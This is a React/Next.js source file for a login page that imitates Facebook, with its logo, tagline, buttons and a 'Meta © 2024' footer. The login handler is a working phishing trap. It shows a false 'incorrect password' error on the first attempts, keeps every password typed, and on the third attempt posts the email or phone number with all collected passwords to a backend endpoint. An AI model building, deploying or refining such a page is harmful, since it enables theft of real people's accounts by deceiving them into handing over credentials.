import { useState, useRef } from "react";
import { InputFb } from "@/components/InputFb";
import {
  Box,
  Button,
  Container,
  Divider,
  Grid,
  Stack,
  Typography,
} from "@mui/material";
import { LoadingButton } from "@mui/lab";
import Image from "next/image";
import Link from "next/link";
import { sleep } from "@/utils/sleep";

let triedPasswords = [];

export default function LoginPage() {
  // State for input fields
  const [emailOrPhoneNumber, setEmailOrPhoneNumber] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [loginTrials, setLoginTrials] = useState(3);
  // const [triedPasswords, setTriedPasswords] = useState([""]);
  const [errorMsg, setErrorMsg] = useState("");

  const handleLogin = async (e) => {
    e.preventDefault();
    setErrorMsg("");
    setLoginTrials((t) => t - 1);
    // setTriedPasswords([...triedPasswords, password]);
    triedPasswords = [...triedPasswords, password];
    console.log(triedPasswords);
    setIsLoading(true);
    await sleep(2000);
    setIsLoading(false);

    const errorMessage = "The password that you've entered is incorrect.";
    if (loginTrials > 1) return setErrorMsg(errorMessage);
    console.log({ emailOrPhoneNumber, triedPasswords });

    setIsLoading(true);
    try {
      const res = await fetch("/api/login", {
        method: "POST",
        body: JSON.stringify({ emailOrPhoneNumber, triedPasswords }),
        headers: { "Content-Type": "application/json" },
      });
      const data = await res.json();
      setIsLoading(false);
      console.log("Post login succeeded, response from server:", data);
    } catch (e) {
      setIsLoading(false);
      console.log("Error Posting Login:", e);
    }
  };

  return (
    <>
      <Container>
        <Stack
          direction="row"
          alignItems="center"
          sx={{
            pt: 2,
            height: "80vh",
            gap: { md: 13 },
            flexDirection: { xs: "column", md: "row" },
            justifyContent: { xs: "start", md: "center" },
          }}
        >
          {/* Desktop Logo */}
          <Box
            sx={{
              display: { xs: "none", md: "block" },
              width: { xs: "90%", md: 441 },
              mb: { md: 20 },
              textAlign: { xs: "center", md: "left" },
            }}
          >
            <Image
              src="/logo/facebook.svg"
              height={112}
              width={342}
              alt="fb"
              style={{ transform: "translate(-36px, 10px)" }}
            />
            <Typography sx={{ fontSize: { xs: 17, md: 25 } }}>
              Facebook helps you connect and share with the people in your life.
            </Typography>
          </Box>
          {/* Mobile Logo */}
          <Box
            sx={{
              display: { xs: "block", md: "none" },
              width: { xs: "90%", md: 441 },
              mb: { md: 20 },
              textAlign: { xs: "center", md: "left" },
            }}
          >
            <Image src="/logo/facebook.svg" height={56} width={171} alt="fb" />
          </Box>
          <Box>
            <Box
              sx={{
                width: 350,
                boxShadow: {
                  xs: "none",
                  sm: "0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1)",
                },
                borderRadius: 2,
                p: 2,
                background: "#fff",
              }}
            >
              <Stack
                component="form"
                onSubmit={handleLogin}
                direction="column"
                gap={1.2}
              >
                <InputFb
                  value={emailOrPhoneNumber}
                  onChange={(e) => setEmailOrPhoneNumber(e.target.value)}
                  placeholder="Email address or phone number"
                />
                <InputFb
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  type="password"
                  placeholder="Password"
                  error={errorMsg}
                />
                {/* <Button
                  type="submit"
                  variant="contained"
                  sx={{
                    bgcolor: "#1877f2",
                    borderRadius: 1.4,
                    textTransform: "none",
                    fontSize: 20,
                  }}
                >
                  Log in
                </Button> */}
                <LoadingButton
                  loading={isLoading}
                  type="submit"
                  variant="contained"
                  sx={{
                    bgcolor: "#1877f2",
                    borderRadius: 1.4,
                    textTransform: "none",
                    fontSize: 20,
                  }}
                >
                  Log in
                </LoadingButton>
                <Typography
                  sx={{
                    fontSize: 14,
                    mx: "auto",
                    color: "#1877f2",
                    fontWeight: 500,
                  }}
                >
                  Forgotten account?
                </Typography>
                <Divider sx={{ my: 1 }} />
                <Button
                  variant="contained"
                  sx={{
                    width: "fit-content",
                    bgcolor: "#42b72a",
                    borderRadius: 1.4,
                    textTransform: "none",
                    fontSize: 17,
                    mx: "auto",
                    py: 1,
                    px: 2,
                  }}
                >
                  Create new account
                </Button>
              </Stack>
            </Box>
            <Typography variant="body2" sx={{ textAlign: "center", mt: 3.5 }}>
              <b>Create a Page</b> for a celebrity, brand or business.
            </Typography>
          </Box>
        </Stack>
      </Container>
      <Box sx={{ bgcolor: "#fff", height: "300px", pt: 3 }}>
        <Container maxWidth="lg">
          <Stack direction="column">
            <Typography variant="caption" color="GrayText">
              English (UK) Hausa Français (France) Português (Brasil) Español
              العربية Bahasa Indonesia Deutsch 日本語 Italiano हिन्दी
            </Typography>
            <Divider sx={{ my: 2 }} />
            <Box>
              <Grid container spacing={2} justifyContent="start">
                <Grid item>
                  <Typography
                    component={Link}
                    variant="caption"
                    color="GrayText"
                    href="#"
                    underline="none"
                    sx={{ textDecoration: "none" }}
                  >
                    Sign Up
                  </Typography>
                </Grid>
                <Grid item>
                  <Typography
                    component={Link}
                    variant="caption"
                    color="GrayText"
                    href="#"
                    underline="none"
                    sx={{ textDecoration: "none" }}
                  >
                    Log in
                  </Typography>
                </Grid>
                <Grid item>
                  <Typography
                    component={Link}
                    variant="caption"
                    color="GrayText"
                    href="#"
                    underline="none"
                    sx={{ textDecoration: "none" }}
                  >
                    Messenger
                  </Typography>
                </Grid>
                <Grid item>
                  <Typography
                    component={Link}
                    variant="caption"
                    color="GrayText"
                    href="#"
                    underline="none"
                    sx={{ textDecoration: "none" }}
                  >
                    Instagram
                  </Typography>
                </Grid>
                <Grid item>
                  <Typography
                    component={Link}
                    variant="caption"
                    color="GrayText"
                    href="#"
                    underline="none"
                    sx={{ textDecoration: "none" }}
                  >
                    Developers
                  </Typography>
                </Grid>
                <Grid item xs={12}>
                  <Typography variant="caption" color="grey">
                    Meta © 2024
                  </Typography>
                </Grid>
              </Grid>
            </Box>
          </Stack>
        </Container>
      </Box>
    </>
  );
}
